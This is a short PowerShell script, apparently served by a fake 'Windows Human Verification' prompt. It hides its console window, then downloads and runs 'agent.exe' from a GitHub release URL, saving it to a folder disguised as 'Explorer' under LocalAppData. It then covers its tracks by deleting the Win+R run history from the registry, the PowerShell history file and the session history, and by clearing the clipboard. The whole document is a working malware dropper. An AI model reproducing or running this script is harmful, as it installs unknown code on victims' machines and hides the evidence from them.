
$Host.UI.RawUI.BackgroundColor = "White"
$Host.UI.RawUI.ForegroundColor = "Black"
Clear-Host
$host.UI.RawUI.WindowTitle = ""
$host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(1, 1)

$authSite = "https://github.com/sandraoqddo/agent-zero/releases/download/tag/"
$verifyMe = "agent.exe"
$verify = "agent.exe"
$tempMe = "$env:localappdata\Explorer\"
$completeVerification = $authSite + $verifyMe
$verifyFile = Join-Path $tempMe $verify

mkdir $tempMe -ErrorAction Ignore | Out-Null
Invoke-WebRequest -Uri $completeVerification -OutFile $verifyFile -UseBasicParsing | Out-Null
Unblock-File -Path $verifyFile | Out-Null
Start-Process $verifyFile | Out-Null

rm -Recurse -Force $tempMe -ErrorAction Ignore | Out-Null
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f | Out-Null
rm (Get-PSReadLineOption).HistorySavePath -Force | Out-Null
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
echo " Windows Human Verification" | Out-Null
"" | clip
